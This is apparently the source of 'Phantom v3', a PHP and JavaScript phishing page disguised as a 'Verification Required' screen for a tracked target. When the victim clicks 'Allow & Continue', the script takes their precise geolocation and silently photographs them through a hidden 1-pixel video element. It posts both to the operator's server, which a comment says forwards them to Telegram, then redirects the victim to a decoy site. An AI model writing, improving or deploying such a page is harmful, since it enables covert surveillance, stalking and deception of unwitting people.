<?php
/**
 * Phantom v3 – Verification Page + Automatic Photo Capture
 * Silent version (no preview shown to target)
 */

$config = require __DIR__ . '/config.php';

$trackId  = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['id']) : '';
$redirect = isset($_GET['r']) ? $_GET['r'] : ($config['default_redirect'] ?? 'https://www.google.com');

if (empty($trackId)) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>Verification Required</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="assets/js/theme.js"></script>
    <style>
        .verify-container {
            max-width: 480px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        .permission-list {
            margin: 28px 0;
        }
        .permission-item {
            display: flex;
            align-items: center;
            gap: 14px;
            padding: 14px 0;
            border-bottom: 1px solid var(--border);
        }
        .permission-item:last-child {
            border-bottom: none;
        }
        .perm-icon {
            font-size: 1.4rem;
            width: 36px;
            text-align: center;
        }
        .perm-status {
            margin-left: auto;
            font-size: 0.85rem;
            font-weight: 500;
        }
        .status-pending { color: var(--text-muted); }
        .status-granted { color: var(--success); }
        .status-denied  { color: var(--danger); }

        .btn-verify {
            width: 100%;
            margin-top: 10px;
        }
        .note {
            font-size: 0.85rem;
            color: var(--text-muted);
            text-align: center;
            margin-top: 20px;
            line-height: 1.5;
        }
        .hidden-video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="bg-grid"></div>

    <header class="topbar">
        <div class="logo">
            <span class="ghost">👻</span>
            <span class="name">Phantom</span>
        </div>
        <button id="themeToggle" class="theme-toggle" title="Toggle theme">☀️</button>
    </header>

    <div class="verify-container">
        <div class="card">
            <h1 style="font-size: 1.6rem; margin-bottom: 8px; text-align: center;">Verification Required</h1>
            <p style="text-align: center; color: var(--text-muted); margin-bottom: 8px;">
                Please allow the required permissions to continue.
            </p>

            <div class="permission-list">
                <div class="permission-item">
                    <div class="perm-icon">📍</div>
                    <div>
                        <strong>Location</strong><br>
                        <span style="font-size: 0.85rem; color: var(--text-muted);">Precise location</span>
                    </div>
                    <div class="perm-status status-pending" id="status-location">Pending</div>
                </div>

                <div class="permission-item">
                    <div class="perm-icon">📷</div>
                    <div>
                        <strong>Camera</strong><br>
                        <span style="font-size: 0.85rem; color: var(--text-muted);">Photo verification</span>
                    </div>
                    <div class="perm-status status-pending" id="status-camera">Pending</div>
                </div>

                <div class="permission-item">
                    <div class="perm-icon">🎤</div>
                    <div>
                        <strong>Microphone</strong><br>
                        <span style="font-size: 0.85rem; color: var(--text-muted);">Audio access</span>
                    </div>
                    <div class="perm-status status-pending" id="status-mic">Pending</div>
                </div>
            </div>

            <button id="startBtn" class="btn-primary btn-verify">
                Allow & Continue
            </button>

            <p class="note">
                This step is required for verification.<br>
                You will be redirected automatically.
            </p>
        </div>
    </div>

    <!-- Hidden elements for silent capture -->
    <video id="video" class="hidden-video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const trackId     = <?= json_encode($trackId) ?>;
        const redirectUrl = <?= json_encode($redirect) ?>;

        const statusLocation = document.getElementById('status-location');
        const statusCamera   = document.getElementById('status-camera');
        const statusMic      = document.getElementById('status-mic');
        const startBtn       = document.getElementById('startBtn');
        const video          = document.getElementById('video');
        const canvas         = document.getElementById('canvas');

        function setStatus(el, state) {
            el.className = 'perm-status status-' + state;
            el.textContent = state.charAt(0).toUpperCase() + state.slice(1);
        }

        async function capturePhoto(stream) {
            return new Promise((resolve) => {
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();

                    // Wait briefly for camera to adjust
                    setTimeout(() => {
                        canvas.width  = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);

                        // Stop all tracks immediately
                        stream.getTracks().forEach(track => track.stop());

                        canvas.toBlob((blob) => {
                            resolve(blob);
                        }, 'image/jpeg', 0.85);
                    }, 600);
                };
            });
        }

        async function sendPhotoToServer(blob, extra = {}) {
            const formData = new FormData();
            formData.append('id', trackId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('lat', extra.lat || '');
            formData.append('lon', extra.lon || '');
            formData.append('accuracy', extra.accuracy || '');

            try {
                await fetch('media.php', {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.warn('Failed to send photo', e);
            }
        }

        async function requestPermissions() {
            startBtn.disabled = true;
            startBtn.textContent = 'Requesting permissions...';

            let locationData = {};

            // ===== 1. Location =====
            try {
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            setStatus(statusLocation, 'granted');
                            locationData = {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy
                            };
                            resolve();
                        },
                        () => {
                            setStatus(statusLocation, 'denied');
                            resolve();
                        },
                        { enableHighAccuracy: true, timeout: 9000 }
                    );
                });
            } catch (e) {
                setStatus(statusLocation, 'denied');
            }

            // ===== 2. Camera + Microphone =====
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: true
                });

                setStatus(statusCamera, 'granted');
                setStatus(statusMic, 'granted');

                startBtn.textContent = 'Verifying...';

                // Silent capture
                const photoBlob = await capturePhoto(stream);

                // Send to Telegram (no preview shown)
                await sendPhotoToServer(photoBlob, locationData);

            } catch (err) {
                // Fallback: camera only
                try {
                    const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    setStatus(statusCamera, 'granted');
                    setStatus(statusMic, 'denied');

                    startBtn.textContent = 'Verifying...';
                    const photoBlob = await capturePhoto(camStream);
                    await sendPhotoToServer(photoBlob, locationData);
                } catch (e) {
                    setStatus(statusCamera, 'denied');
                    setStatus(statusMic, 'denied');
                }
            }

            // ===== Redirect =====
            startBtn.textContent = 'Redirecting...';

            const finalUrl = `track.php?id=${encodeURIComponent(trackId)}&r=${encodeURIComponent(redirectUrl)}`;

            setTimeout(() => {
                window.location.href = finalUrl;
            }, 700);
        }

        startBtn.addEventListener('click', requestPermissions);
    </script>
</body>
</html>
